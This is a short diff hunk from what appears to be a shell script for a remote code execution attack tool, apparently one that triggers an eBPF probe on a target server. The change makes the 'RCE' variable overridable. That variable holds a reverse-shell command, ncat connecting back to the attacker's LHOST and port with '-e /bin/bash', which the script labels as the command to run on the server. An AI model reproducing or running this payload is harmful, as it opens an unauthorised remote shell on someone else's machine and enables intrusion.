@@ -48,7 +48,7 @@ NCATLISTENPORT="3545"
 #
 # The command to run on the server!
 # ================================================
-RCE="ncat ${LHOST} ${NCATLISTENPORT} -e /bin/bash &"
+RCE=${RCE:-"ncat ${LHOST} ${NCATLISTENPORT} -e /bin/bash &"}
 # ================================================
 
 # Trigger is used to fire the eBPF probe on the server.
